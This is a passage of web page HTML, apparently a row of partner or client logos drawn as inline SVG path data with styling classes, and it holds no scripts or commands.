13.525H39.6283L38.5301 16.6428C26.3026 19.5321 15.0938 25.9878 15.0938 25.9878H21.4817C21.4817 25.9878 57.2689 5.35331 110.598 15.2825L111.003 14.8175C111 14.8191 106.748 12.9458 92.6603 12.024Z"
                  fill="currentColor"
                ></path>
                <path
                  d="M52.2599 6.99188C52.5648 5.29896 53.4521 3.28831 55.2105 3.28831C56.9283 3.23204 57.2365 5.16823 56.9089 6.99188C56.5098 9.20774 55.5576 10.8461 53.882 10.8461C52.0263 10.8461 51.9517 8.70466 52.2599 6.99188ZM65.0211 6.23892L67.584 11.6338C66.4242 11.6801 65.2709 11.7463 64.1273 11.8323L65.0211 6.23892Z"
                  fill="#EFF6FE"
                ></path>
              </g>
            </svg>
          </div>
          <div
            class="w-2/12 sm:-ml-1 sm:flex sm:w-1/3 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="114"
              height="34"
              viewBox="0 0 114 34"
              fill="none"
            >
              <g clip-path="url(#clip0)">
                <path
                  d="M84.3761 22.2412C80.4423 22.2412 77.9536 19.9049 77.9536 16.2795C77.9536 12.4124 80.2015 10.076 83.8142 10.076H84.1353C84.7775 10.076 85.4198 10.076 86.062 10.1566V5.48389H88.6311V21.7578C87.2663 22.0801 85.8212 22.2412 84.3761 22.2412ZM84.2958 12.0901C81.8071 12.0901 80.6029 13.4597 80.6029 16.1989C80.6029 18.6964 82.048 20.2271 84.4564 20.2271C84.9381 20.2271 85.4198 20.2271 86.1423 20.1466V12.2513C85.5001 12.1707 84.9381 12.0901 84.2958 12.0901ZM49.1325 21.919L42.148 9.67322V21.919H39.7395V6.45066H43.1113L50.0958 18.5353V6.45066H52.5846V21.919H49.1325ZM71.2902 22.1607C70.0057 22.1607 68.7212 21.9995 67.4367 21.7578H67.2761V19.5826L67.517 19.6632C68.6409 19.9854 69.8451 20.1466 70.9691 20.1466C71.8522 20.1466 73.9395 19.9854 73.9395 18.6964C73.9395 17.5685 72.4944 17.3268 71.3705 17.0851H71.2902L70.648 16.8434C68.962 16.4406 67.1156 15.7155 67.1156 13.4597C67.1156 11.2039 68.8818 9.99548 71.9325 9.99548C73.0564 9.99548 74.1804 10.076 75.3043 10.3177L75.7057 10.3983V12.493H75.4649C74.4212 12.2513 73.2973 12.1707 72.2536 12.0901C71.0494 12.0901 69.6043 12.3318 69.6043 13.3792C69.6043 14.2654 70.8085 14.5071 72.1733 14.8293C74.1001 15.2321 76.4282 15.7961 76.4282 18.3741C76.5085 20.7911 74.5818 22.1607 71.2902 22.1607ZM95.9367 22.1607C93.2874 22.1607 90.7987 21.6773 90.7987 18.2936C90.7987 14.5876 94.6522 14.5876 96.9001 14.5876C97.1409 14.5876 98.1846 14.6682 98.5057 14.6682C98.5057 12.5735 98.5057 12.0901 95.455 12.0901C94.2508 12.1707 92.9663 12.2513 91.7621 12.5735H91.5212V10.5594H91.6818C92.9663 10.3177 94.3311 10.1566 95.6958 10.1566C98.586 10.1566 101.075 10.4789 101.075 14.1042V21.9995H100.914C99.2282 21.9995 97.6226 22.0801 95.9367 22.1607ZM96.8198 16.36C94.6522 16.36 93.2874 16.6823 93.2874 18.2936C93.2874 20.1466 95.0536 20.3077 96.6592 20.3077C97.3015 20.3077 98.3451 20.2271 98.6663 20.2271V16.4406L96.8198 16.36ZM59.8099 22.1607C57.1606 22.1607 54.6719 21.6773 54.6719 18.2936C54.6719 14.5876 58.5254 14.5876 60.7733 14.5876C61.0142 14.5876 62.0578 14.6682 62.3789 14.6682C62.3789 12.5735 62.3789 12.0901 59.3282 12.0901C58.124 12.1707 56.8395 12.2513 55.6353 12.5735H55.3944V10.5594H55.555C56.8395 10.3177 58.2043 10.1566 59.5691 10.1566C62.4592 10.1566 64.948 10.4789 64.948 14.1042V21.9995H64.7874C63.1818 21.9995 61.4958 22.0801 59.8099 22.1607ZM60.693 16.36C58.5254 16.36 57.1606 16.6823 57.1606 18.2936C57.1606 20.1466 58.9268 20.3077 60.5325 20.3077C61.1747 20.3077 62.2184 20.2271 62.5395 20.2271V16.4406L60.693 16.36ZM111.351 27.1556V22.0801C110.709 22.1607 110.066 22.2412 109.424 22.2412C108.38 22.2412 107.337 21.9995 106.373 21.6773C104.447 20.8716 103.242 18.777 103.242 16.1184C103.242 14.7488 103.563 12.3318 105.731 11.0428C107.016 10.3177 108.541 9.99548 110.066 10.1566C110.789 10.1566 111.672 10.2372 112.555 10.2372L114 10.3177V26.0277L111.351 27.1556ZM109.825 12.0901C107.176 12.0901 105.892 13.4597 105.892 16.0378C105.892 19.4215 107.899 20.1466 109.504 20.1466C110.147 20.1466 110.789 20.066 111.351 19.9854V12.0901H109.825Z"
                  fill="currentColor"
                ></path>
              </g>
            </svg>
          </div>
          <div
            class="w-2/12 sm:-mt-10 sm:flex sm:justify-center sm:w-1/2 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="124"
              height="124"
              viewBox="0 0 124 124"
              fill="none"
            >
              <path
                d="M56.2669 53.7275C56.3228 53.532 56.3788 53.3223 57.1758 53.3223C59.65 53.3223 60.1247 55.0412 60.1247 56.4532C60.1247 57.3056 59.6635 61.6105 55.2607 61.6105C54.6039 61.6105 54.2681 61.5269 54.2681 61.0656C54.2681 60.8418 54.4502 60.2268 54.5756 59.7655L56.2669 53.7275ZM53.7097 53.1261C54.4225 53.182 54.786 53.2521 54.786 53.7275C54.786 54.0074 54.6741 54.4403 54.6322 54.5941L52.9133 60.7723C52.676 61.6388 52.4662 61.6806 51.7811 61.8061V62.03H55.3173C59.4267 62.03 61.677 59.4439 61.677 56.6211C61.677 55.1537 60.8105 52.9028 57.5959 52.9028H53.7104V53.1261H53.7097ZM64.5693 60.5902C64.0244 61.415 63.4094 62.1837 62.6265 62.1837C61.9697 62.1837 61.9697 61.5687 61.9697 61.3172C61.9697 60.6604 63.0736 57.1936 63.0736 56.8025C63.0736 56.5092 62.9617 56.439 62.1929 56.439V56.2152C62.7243 56.1875 63.8842 55.9636 64.429 55.8659L64.4709 55.8935L63.2409 60.394C63.1849 60.5896 63.017 61.1486 63.017 61.3165C63.017 61.4143 63.1148 61.5262 63.2409 61.5262C63.4088 61.5262 63.814 61.2464 64.3872 60.4359L64.5693 60.5902ZM64.2901 54.3702C63.9408 54.3702 63.6191 54.1322 63.6191 53.6433C63.6191 53.1544 63.9408 52.8887 64.2759 52.8887C64.7372 52.8887 64.9746 53.3499 64.9746 53.6574C64.9746 53.9366 64.7507 54.3702 64.2901 54.3702ZM71.0968 60.5761C70.3982 61.5127 69.9087 62.1554 69.1541 62.1554C68.5108 62.1554 68.4831 61.736 68.4831 61.3307C68.4831 60.9955 69.5175 57.5848 69.5175 57.0257C69.5175 56.7742 69.4339 56.5786 69.1682 56.5786C68.4973 56.5786 67.6166 57.781 67.1135 58.5632C66.4709 59.5275 66.2888 60.129 65.7163 62.0293H64.6684C65.1013 60.45 66.0379 57.1795 66.0379 56.8855C66.0379 56.6758 65.8983 56.522 65.1437 56.522V56.2982C65.8983 56.1586 66.6529 56.019 67.4082 55.8652L67.45 55.8929L66.5551 58.8141L66.5828 58.8418C67.2396 57.8073 68.5256 55.8646 69.6854 55.8646C70.3287 55.8646 70.6497 56.1997 70.6497 56.7871C70.6497 57.3879 69.5317 60.8405 69.5317 61.2599C69.5317 61.4696 69.7273 61.4979 69.7556 61.4979C70.0354 61.4979 70.3847 61.0508 70.9019 60.3934L71.0968 60.5761ZM72.8859 58.5072C73.4031 57.2631 74.3532 56.1875 75.1085 56.1875C75.4578 56.1875 75.5974 56.4532 75.5974 56.7465C75.5974 56.8585 75.5279 58.5356 72.6485 59.1229L72.8859 58.5072ZM75.7646 60.506C75.066 61.0792 74.4787 61.5545 73.7241 61.5545C73.1367 61.5545 72.4105 61.2329 72.4105 60.2821C72.4105 60.0023 72.4806 59.7231 72.5501 59.4297L72.9412 59.3738C75.2056 59.0521 76.5192 57.9199 76.5192 56.816C76.5192 56.201 76.0856 55.8652 75.3729 55.8652C73.4024 55.8652 71.194 58.2133 71.194 60.212C71.194 61.0927 71.6411 62.1824 73.1091 62.1824C74.507 62.1824 75.7788 60.8965 75.9325 60.6726L75.7646 60.506ZM76.6176 62.0293L77.7498 57.9482C77.8894 57.431 77.9731 56.9563 77.9731 56.8302C77.9731 56.6346 77.9036 56.4114 77.47 56.4114C77.3163 56.4114 77.1625 56.4532 77.0088 56.4809V56.2435C77.7215 56.1457 78.5463 55.9636 79.1754 55.8659L79.2172 55.8935L78.5327 58.6751L78.5604 58.7028L78.6723 58.423C79.1336 57.5005 80.1963 55.8652 81.0763 55.8652C81.398 55.8652 81.7473 56.0749 81.7473 56.5497C81.7473 57.2766 81.2443 57.2766 81.0905 57.2766C80.4897 57.2766 80.6994 56.7736 80.3636 56.7736C79.9306 56.7736 79.0918 58.3252 78.9798 58.5349C78.4485 59.541 78.2529 60.1702 77.6797 62.0293H76.6176ZM81.0339 59.9888C81.1317 60.6038 81.3555 61.8897 82.4877 61.8897C83.27 61.8897 83.4939 61.2187 83.4939 60.7575C83.4939 59.835 81.8309 58.4931 81.8309 57.4169C81.8309 56.9839 82.0265 55.8652 83.508 55.8652C84.1372 55.8652 84.4164 56.1032 84.8358 56.1032C85.0738 56.1032 85.1574 55.9636 85.2269 55.8511H85.4225L85.1426 57.7945H84.9188C84.8493 56.9974 84.5135 56.1869 83.6052 56.1869C83.2977 56.1869 82.8506 56.3123 82.8506 56.9974C82.8506 57.8781 84.5553 59.1222 84.5553 60.3098C84.5553 61.8331 83.2552 62.1831 82.473 62.1831C82.0535 62.1831 81.4945 61.9174 81.0892 61.9174C80.8937 61.9174 80.8377 62.057 80.7541 62.2114H80.5302L80.81 59.9888H81.0339ZM96.9819 55.4882C96.9543 55.0971 96.8282 53.2238 94.8294 53.2238C92.0343 53.2238 90.6081 56.6063 90.6081 58.661C90.6081 60.4925 91.3769 61.6523 93.0404 61.6523C94.6197 61.6523 95.5982 60.6597 96.2692 60.0029L96.5065 60.1985C95.9893 60.8135 94.7452 62.2808 92.7046 62.2808C91.0829 62.2808 89.043 61.3024 89.043 58.5072C89.043 55.8099 91.5165 52.7208 94.7175 52.7208C95.7236 52.7208 96.5767 53.0559 96.8977 53.0559C97.3029 53.0559 97.3866 52.888 97.4567 52.7484H97.75L97.2328 55.5301L96.9819 55.4882ZM99.5532 60.4359C98.8404 61.5121 98.2949 62.1831 97.4284 62.1831C96.8134 62.1831 96.7574 61.7077 96.7574 61.3165C96.7574 61.0225 98.7845 53.7269 98.7845 53.4335C98.7845 53.0707 98.1971 53.0707 97.8337 53.0842V52.8604C98.5606 52.7767 99.2875 52.6507 100.014 52.4834L100.084 52.5529L97.9733 60.6456C97.9456 60.7717 97.8337 61.1486 97.8337 61.3024C97.8337 61.386 97.8337 61.5822 98.0434 61.5822C98.3927 61.5822 98.6867 61.1911 99.3711 60.3098L99.5532 60.4359ZM106.011 60.5201C105.13 61.7919 104.767 62.1554 104.068 62.1554C103.439 62.1554 103.411 61.6382 103.411 61.4285C103.411 61.1769 103.691 60.0029 104.012 58.8566H103.97C103.019 60.4359 101.986 62.1831 100.727 62.1831C100.224 62.1831 99.9585 61.9733 99.9585 61.3583C99.9585 60.7434 101.021 57.2206 101.021 56.8437C101.021 56.4384 100.755 56.4384 100.182 56.4384V56.2435C100.888 56.1582 101.588 56.0321 102.279 55.8659L102.321 55.8935L101.048 60.9672C101.006 61.1486 101.048 61.442 101.342 61.442C101.943 61.442 102.824 60.1284 103.299 59.4014C103.984 58.367 104.292 57.4863 104.837 55.9907H105.871L104.767 60.1702C104.684 60.45 104.501 61.065 104.501 61.2747C104.501 61.3442 104.515 61.4986 104.669 61.4986C104.935 61.4986 105.326 61.009 105.816 60.394L106.011 60.5201ZM111.084 57.7385C111.084 58.9125 109.757 61.862 107.841 61.862C107.185 61.862 107.185 61.4986 107.185 61.4008C107.185 59.9334 108.527 56.5503 110.064 56.5503C110.945 56.5503 111.084 57.3056 111.084 57.7385ZM107.199 53.0424C108.009 53.0566 108.107 53.1261 108.107 53.4477C108.107 53.6433 107.982 53.9926 107.884 54.3843L105.983 61.3867V61.4426C105.983 61.7501 107.059 62.1837 107.8 62.1837C109.939 62.1837 112.273 59.7655 112.273 57.5571C112.273 56.5368 111.588 55.8659 110.61 55.8659C109.352 55.8659 108.471 57.166 108.01 57.8923L107.982 57.8787C108.458 56.2988 109.1 53.6992 109.408 52.5535L109.338 52.484C108.611 52.6236 107.899 52.7214 107.2 52.8057V53.0424H107.199ZM51.7856 72.6971C52.4707 72.571 52.6805 72.5292 52.9178 71.6627L54.6367 65.4845C54.7204 65.2046 54.7905 64.8695 54.7905 64.6179C54.7905 64.129 54.4135 64.0872 53.812 64.0171V63.7932H57.2646V64.0171C56.5801 64.1432 56.3563 64.1708 56.1183 65.0515L54.3994 71.2433C54.3157 71.5231 54.2456 71.8023 54.2456 72.1381C54.2456 72.5852 54.5949 72.6277 55.1964 72.6971V72.921H51.7856V72.6971Z"
                fill="currentColor"
              ></path>
              <path
                d="M61.9189 71.4675C61.2197 72.4041 60.7308 73.0474 59.9755 73.0474C59.3329 73.0474 59.3046 72.628 59.3046 72.2227C59.3046 71.8876 60.339 68.4768 60.339 67.9178C60.339 67.6662 60.2554 67.4707 59.9897 67.4707C59.3187 67.4707 58.438 68.673 57.935 69.4553C57.2917 70.4196 57.1103 71.0204 56.5371 72.9214H55.4891C55.9221 71.3421 56.8587 68.0709 56.8587 67.7775C56.8587 67.5678 56.7191 67.4141 55.9645 67.4141V67.1902C56.7191 67.0506 57.4737 66.9104 58.229 66.7566L58.2708 66.7849L57.3766 69.7061L57.4042 69.7344C58.0611 68.7 59.347 66.7572 60.5069 66.7572C61.1502 66.7572 61.4718 67.093 61.4718 67.6804C61.4718 68.2812 60.3538 71.7338 60.3538 72.1533C60.3538 72.363 60.5493 72.3906 60.5776 72.3906C60.8575 72.3906 61.2068 71.9435 61.7234 71.2867L61.9189 71.4675ZM65.6507 67.3857H64.4767L63.2467 72.04C63.2326 72.0818 63.2326 72.1095 63.2326 72.152C63.2326 72.2774 63.302 72.3893 63.4564 72.3893C63.7363 72.3893 64.2252 71.7325 64.5745 71.2854L64.7559 71.3832C64.0431 72.4595 63.4982 73.0745 62.7713 73.0745C62.4915 73.0745 62.1003 72.9349 62.1003 72.5154C62.1003 72.3057 62.366 71.4533 62.422 71.2295L63.4281 67.3857H62.3937C62.3802 67.3021 62.3802 67.232 62.422 67.1619C62.5056 67.0358 62.8967 66.938 63.1348 66.8126C63.596 66.5745 64.267 65.946 64.6581 65.4565C64.7141 65.387 64.77 65.2609 64.8955 65.2892C64.9933 65.2609 65.0216 65.387 64.9933 65.4989L64.6021 66.9387H65.7202L65.6507 67.3857ZM66.8942 69.3986C67.4114 68.1545 68.3622 67.0783 69.1168 67.0783C69.4661 67.0783 69.6064 67.3439 69.6064 67.6373C69.6064 67.7492 69.5363 69.4263 66.6575 70.0136L66.8942 69.3986ZM69.7736 71.3974C69.075 71.9706 68.4877 72.4453 67.7331 72.4453C67.1458 72.4453 66.4195 72.1237 66.4195 71.1735C66.4195 70.8937 66.4889 70.6145 66.5591 70.3211L66.9502 70.2652C69.2146 69.9435 70.5282 68.8113 70.5282 67.7068C70.5282 67.0918 70.0947 66.756 69.3819 66.756C67.4114 66.756 65.2023 69.104 65.2023 71.1027C65.2023 71.9834 65.6494 73.0732 67.1175 73.0732C68.5153 73.0732 69.7872 71.7872 69.9409 71.564L69.7736 71.3974ZM70.9059 72.9207L72.0381 68.8396C72.1777 68.3224 72.2619 67.847 72.2619 67.7216C72.2619 67.526 72.1918 67.3021 71.7589 67.3021C71.6051 67.3021 71.4514 67.3439 71.2976 67.3722V67.1342C72.0104 67.0364 72.8351 66.8544 73.4643 66.7566L73.5061 66.7849L72.8216 69.5665L72.8493 69.5942L72.9612 69.3144C73.4225 68.3919 74.4845 66.756 75.3652 66.756C75.6869 66.756 76.0362 66.9657 76.0362 67.4411C76.0362 68.168 75.5331 68.168 75.3794 68.168C74.7785 68.168 74.9882 67.6649 74.6531 67.6649C74.2195 67.6649 73.3806 69.2166 73.2693 69.4263C72.738 70.4324 72.5424 71.0616 71.9692 72.9207H70.9059Z"
                fill="currentColor"
              ></path>
              <path
                d="M81.64 71.4673C80.9414 72.404 80.4519 73.0473 79.6973 73.0473C79.0539 73.0473 79.0263 72.6278 79.0263 72.2225C79.0263 71.8874 80.0607 68.4766 80.0607 67.9175C80.0607 67.666 79.9771 67.4704 79.7114 67.4704C79.0411 67.4704 78.1597 68.6728 77.6567 69.455C77.014 70.4194 76.832 71.0202 76.2588 72.9212H75.2108C75.6444 71.3419 76.5804 68.0706 76.5804 67.7773C76.5804 67.5676 76.4408 67.4138 75.6856 67.4138V67.1899C76.4402 67.0503 77.1954 66.9101 77.95 66.7563L77.9918 66.7847L77.097 69.7059L77.1247 69.7342C77.7815 68.6998 79.0675 66.757 80.228 66.757C80.8713 66.757 81.1923 67.0928 81.1923 67.6801C81.1923 68.281 80.0742 71.7336 80.0742 72.1531C80.0742 72.3628 80.2698 72.3905 80.2981 72.3905C80.5779 72.3905 80.9273 71.9434 81.4445 71.2865L81.64 71.4673Z"
                fill="currentColor"
              ></path>
              <path
                d="M82.7163 71.3971C82.7163 70.1388 83.9746 67.0645 85.6099 67.0645C86.0151 67.0645 86.4069 67.3301 86.4069 68.0011C86.4069 69.3707 85.0373 72.3897 83.5552 72.3897C83.1776 72.3897 82.7163 72.1382 82.7163 71.3971ZM87.79 71.3829C87.1609 71.9979 86.881 72.3479 86.6719 72.3479C86.56 72.3479 86.4764 72.2642 86.4764 72.1658C86.4764 71.7329 87.7623 66.966 87.8042 66.7988L87.7064 66.757L86.854 66.8548L86.8122 66.8966L86.6726 67.5122H86.6449C86.6031 67.1204 86.1419 66.757 85.541 66.757C83.6819 66.757 81.5436 69.3707 81.5436 71.4254C81.5436 71.8307 81.5854 73.0742 82.9833 73.0742C83.8221 73.0742 84.5626 72.6547 85.7224 70.95L85.7501 70.9776C85.5262 71.83 85.4568 72.1375 85.4568 72.4592C85.4568 72.6965 85.4568 73.06 86.0441 73.06C86.6449 73.06 87.1203 72.5569 87.9592 71.5225L87.79 71.3829ZM91.9412 67.3855H90.7672L89.5372 72.0397C89.5231 72.0815 89.5231 72.1092 89.5231 72.1517C89.5231 72.2771 89.5932 72.389 89.7469 72.389C90.0268 72.389 90.5157 71.7322 90.865 71.2851L91.0464 71.3829C90.3336 72.4592 89.7887 73.0742 89.0618 73.0742C88.782 73.0742 88.3908 72.9346 88.3908 72.5151C88.3908 72.3054 88.6565 71.453 88.7125 71.2292L89.7186 67.3855H88.6842C88.6707 67.3018 88.6707 67.2317 88.7125 67.1616C88.7961 67.0355 89.1872 66.9377 89.4253 66.8123C89.8865 66.5743 90.5575 65.9458 90.9486 65.4562C91.0046 65.3867 91.0605 65.2607 91.1866 65.289C91.2844 65.2607 91.3121 65.3867 91.2844 65.4987L90.8933 66.9384H92.0113L91.9412 67.3855ZM94.6251 71.4813C94.0795 72.3061 93.4652 73.0748 92.6823 73.0748C92.0255 73.0748 92.0255 72.4598 92.0255 72.2083C92.0255 71.5515 93.1294 68.0854 93.1294 67.6936C93.1294 67.3996 93.0174 67.3301 92.2487 67.3301V67.1063C92.7794 67.0786 93.9393 66.8548 94.4848 66.757L94.5266 66.7853L93.2966 71.2858C93.2407 71.4813 93.0728 72.0404 93.0728 72.2083C93.0728 72.3061 93.1706 72.418 93.2966 72.418C93.4645 72.418 93.8698 72.1382 94.4424 71.3276L94.6251 71.4813ZM94.3452 65.2613C93.9959 65.2613 93.6743 65.0239 93.6743 64.5344C93.6743 64.0455 93.9959 63.7798 94.3311 63.7798C94.7923 63.7798 95.0297 64.241 95.0297 64.5485C95.0303 64.8277 94.8065 65.2613 94.3452 65.2613ZM99.1957 67.0503C99.866 67.0503 100.174 67.6653 100.174 68.3922C100.174 69.8879 99.0702 72.7808 97.4768 72.7808C96.7782 72.7808 96.3587 72.2777 96.3587 71.4807C96.3581 69.8319 97.6299 67.0503 99.1957 67.0503ZM99.2935 66.7563C97.2529 66.7563 95.1841 69.0072 95.1841 71.0613C95.1841 72.2211 95.8132 73.0735 97.2947 73.0735C99.4331 73.0735 101.348 70.5441 101.348 68.8245C101.348 67.9027 100.915 66.7563 99.2935 66.7563Z"
                fill="currentColor"
              ></path>
              <path
                d="M107.442 71.4676C106.743 72.4043 106.254 73.0476 105.499 73.0476C104.856 73.0476 104.828 72.6282 104.828 72.2229C104.828 71.8877 105.863 68.4769 105.863 67.9179C105.863 67.6664 105.779 67.4708 105.513 67.4708C104.843 67.4708 103.962 68.6731 103.459 69.4554C102.815 70.4197 102.634 71.0206 102.061 72.9215H101.013C101.447 71.3422 102.383 68.071 102.383 67.7777C102.383 67.5679 102.243 67.4142 101.488 67.4142V67.1903C102.242 67.0507 102.998 66.9105 103.752 66.7567L103.794 66.785L102.899 69.7063L102.927 69.7346C103.584 68.7002 104.87 66.7574 106.03 66.7574C106.673 66.7574 106.994 67.0932 106.994 67.6805C106.994 68.2814 105.876 71.734 105.876 72.1534C105.876 72.3631 106.072 72.3908 106.1 72.3908C106.38 72.3908 106.729 71.9437 107.247 71.2869L107.442 71.4676ZM108.798 71.3975C108.798 70.1392 110.056 67.0649 111.691 67.0649C112.096 67.0649 112.488 67.3306 112.488 68.0015C112.488 69.3711 111.118 72.3901 109.636 72.3901C109.259 72.3901 108.798 72.1386 108.798 71.3975ZM113.871 71.3834C113.242 71.9984 112.962 72.3483 112.753 72.3483C112.641 72.3483 112.558 72.2647 112.558 72.1663C112.558 71.7333 113.844 66.9665 113.885 66.7992L113.788 66.7574L112.935 66.8552L112.893 66.897L112.753 67.5126H112.726C112.684 67.1208 112.222 66.7574 111.622 66.7574C109.762 66.7574 107.624 69.3711 107.624 71.4258C107.624 71.8311 107.666 73.0746 109.064 73.0746C109.902 73.0746 110.643 72.6552 111.803 70.9504L111.831 70.9781C111.607 71.8305 111.537 72.138 111.537 72.4596C111.537 72.697 111.537 73.0605 112.124 73.0605C112.726 73.0605 113.2 72.5574 114.039 71.523L113.871 71.3834ZM117.044 71.3274C116.331 72.4036 115.786 73.0746 114.92 73.0746C114.305 73.0746 114.249 72.5999 114.249 72.2081C114.249 71.9147 116.275 64.6184 116.275 64.3251C116.275 63.9616 115.688 63.9616 115.324 63.9757V63.7519C116.058 63.667 116.786 63.5409 117.505 63.3743L117.575 63.4444L115.464 71.5371C115.436 71.6626 115.324 72.0402 115.324 72.1939C115.324 72.2776 115.324 72.4738 115.534 72.4738C115.883 72.4738 116.177 72.0826 116.862 71.202L117.044 71.3274ZM119.004 63.6895H119.148C119.281 63.6895 119.389 63.7557 119.389 63.9552C119.389 64.1404 119.323 64.2729 119.151 64.2729H119.004V63.6895ZM118.613 63.6753C118.784 63.6927 118.781 63.6895 118.781 63.8432V64.6782C118.781 64.8281 118.784 64.8281 118.613 64.8461V64.8982H119.172V64.8461C118.998 64.8288 119.004 64.8288 119.004 64.6782V64.336H119.168C119.388 64.6609 119.476 64.8982 119.588 64.8982H119.808V64.8667C119.741 64.8178 119.637 64.6995 119.546 64.5734L119.346 64.3006C119.504 64.2485 119.622 64.1153 119.622 63.9378C119.622 63.721 119.43 63.6232 119.224 63.6232H118.612V63.6753H118.613ZM120.353 64.28C120.353 63.6193 119.84 63.0815 119.175 63.0815C119.018 63.0811 118.862 63.1119 118.717 63.172C118.572 63.2322 118.44 63.3206 118.329 63.432C118.219 63.5435 118.131 63.6759 118.072 63.8214C118.012 63.967 117.983 64.1229 117.984 64.28C117.984 64.94 118.505 65.4714 119.175 65.4714C119.84 65.4714 120.353 64.94 120.353 64.28ZM120.161 64.28C120.161 64.8352 119.724 65.3247 119.175 65.3247C118.616 65.3247 118.176 64.8352 118.176 64.28C118.176 63.7242 118.613 63.2282 119.175 63.2282C119.728 63.2282 120.161 63.721 120.161 64.28Z"
                fill="currentColor"
              ></path>
              <path
                d="M34.4191 76.6048C42.4147 76.644 48.9712 70.0868 48.9153 62.1086C48.9706 53.9123 42.4147 47.3558 34.4191 47.3584H18.3977C10.3063 47.3565 3.74978 53.9123 3.64685 62.1086C3.74978 70.0868 10.3063 76.6434 18.3971 76.6048H34.4191Z"
                fill="currentColor"
              ></path>
              <path
                d="M4.66455 62.1086C4.74432 54.4617 10.855 48.3503 18.3977 48.3761C25.9321 48.3503 32.0434 54.4617 32.1303 62.1093C32.0434 69.5387 25.9321 75.6501 18.3977 75.5877C10.855 75.6501 4.74432 69.5381 4.66455 62.1086Z"
                fill="#EFF6FE"
              ></path>
              <path
                d="M15.3453 53.9707C12.1847 55.3969 9.81353 58.4461 9.75049 62.1085C9.81353 65.6331 12.0715 68.7377 15.3453 69.9921V53.9707ZM21.4489 69.9928C24.715 68.7383 26.9723 65.6331 27.0437 62.1091C26.9723 58.3677 24.7143 55.2625 21.4489 53.9713V69.9928Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-2/12 sm:-mt-10 sm:flex sm:justify-center sm:w-1/2 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="128"
              height="128"
              viewBox="0 0 128 128"
              fill="none"
            >
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M97.2657 86.1168H98.0532V82.0455H95.1633V82.8988H97.0685V83.4905C97.0685 84.7383 96.2796 85.4607 95.0325 85.4607C93.5875 85.4607 92.6678 84.213 92.6678 81.9134C92.6678 79.6815 93.5211 78.4337 95.0325 78.4337C96.0166 78.4337 96.6747 79.0241 97.0027 80.2718L97.9224 80.0746C97.4622 78.4337 96.5425 77.6455 95.0325 77.6455C92.9965 77.6455 91.7487 79.2213 91.7487 81.9798C91.7487 84.6725 92.9965 86.2483 95.0325 86.2483C95.9522 86.2483 96.6747 85.9203 97.1999 85.1978L97.2657 86.1168ZM100.286 86.1168H101.139V82.768C101.467 81.5203 102.125 80.8628 102.979 80.8628H103.045V80.0095H102.848C102.059 80.0095 101.534 80.4684 101.14 81.4545V80.0746H100.286V86.1168H100.286ZM103.965 83.0961C103.965 85.132 104.884 86.2476 106.46 86.2476C108.036 86.2476 108.956 85.132 108.956 83.0961C108.956 81.0601 108.036 79.9431 106.46 79.9431C104.884 79.9431 103.965 81.0594 103.965 83.0961ZM104.818 83.0961C104.818 81.5203 105.41 80.6656 106.46 80.6656C107.511 80.6656 108.102 81.5203 108.102 83.0961C108.102 84.6719 107.511 85.5252 106.46 85.5252C105.41 85.5252 104.818 84.6719 104.818 83.0961ZM115.062 80.0739H114.275V84.6068C113.683 85.1971 113.158 85.5252 112.567 85.5252C111.844 85.5252 111.583 85.132 111.583 84.2774V80.0739H110.728V84.541C110.728 85.658 111.32 86.2476 112.305 86.2476C113.028 86.2476 113.684 85.9196 114.34 85.1971V86.1168H115.062V80.0739ZM117.493 88.35H118.282V85.4601C118.675 85.9854 119.202 86.2476 119.858 86.2476C121.5 86.2476 122.354 85.132 122.354 83.1625C122.354 81.1265 121.434 79.9431 119.858 79.9431C119.136 79.9431 118.675 80.2712 118.282 80.7964L118.085 80.0739H117.493V88.35ZM118.282 84.6068V81.5847C118.675 80.993 119.201 80.665 119.857 80.665C120.974 80.665 121.5 81.5196 121.5 83.1618C121.5 84.7376 120.908 85.5252 119.924 85.5252C119.266 85.5252 118.74 85.2629 118.282 84.6068ZM5.64709 77.7106H7.61734C8.73361 77.7106 9.58758 77.8414 10.2443 78.3667C11.164 79.0892 11.7544 80.2705 11.7544 81.9127C11.7544 84.6712 10.3094 86.1162 7.42011 86.1162H5.64709V77.7106ZM6.56681 78.4981V85.2635H7.2893C8.34049 85.2635 9.12806 85.1971 9.71973 84.6719C10.4422 84.1466 10.836 83.1625 10.836 81.9134C10.836 80.5348 10.4422 79.6151 9.71973 79.0234C9.06298 78.5646 8.34049 78.4981 7.42078 78.4981H6.56681ZM18.1253 84.8027C17.5994 85.7224 16.8111 86.1826 15.6955 86.1826C14.1191 86.1826 13.2651 85.132 13.2651 83.0296C13.2651 81.0594 14.1841 79.9431 15.6298 79.9431C17.0748 79.9431 17.9945 80.9937 17.9945 82.9652V83.2275H14.1197V83.4248C14.1197 84.7389 14.7765 85.4607 15.7619 85.4607C16.4844 85.4607 17.1412 85.1327 17.4692 84.4102L18.1253 84.8027ZM17.0748 82.5044C17.0748 81.323 16.4838 80.665 15.6298 80.665C14.7107 80.665 14.1848 81.3224 14.1191 82.5044H17.0748ZM24.0367 86.1168H23.3142V85.1971C22.6574 85.8545 22 86.1826 21.2782 86.1826C20.2934 86.1826 19.7018 85.5909 19.7018 84.5404V80.0089H20.5557V84.2123C20.5557 85.0656 20.8187 85.4601 21.5405 85.4601C22.1322 85.4601 22.6574 85.1971 23.2485 84.5404V80.0089H24.0367V86.1168ZM28.8311 86.0504C28.5024 86.1826 28.2401 86.1826 27.9114 86.1826C26.9917 86.1826 26.5322 85.7881 26.5322 84.9999V80.7314H25.6125V80.0089H26.5322V78.0386H27.3862V80.0089H28.7654V80.7314H27.3862V84.6719C27.3862 85.2635 27.5176 85.4607 28.2401 85.4607C28.4367 85.4607 28.6339 85.3943 28.8311 85.3943V86.0504ZM30.2755 84.541C30.8014 85.1971 31.3267 85.5252 32.0485 85.5252C32.7703 85.5252 33.2305 85.0663 33.2305 84.4746C33.2305 83.6871 32.5737 83.6213 31.3917 83.2269C30.3405 82.9646 29.8153 82.3736 29.8153 81.5847C29.8153 80.6005 30.6035 79.9425 31.654 79.9425C32.5737 79.9425 33.2962 80.2705 33.8872 80.9279L33.2962 81.5196C32.8367 80.9279 32.3108 80.5999 31.7198 80.5999C31.1281 80.5999 30.735 80.993 30.735 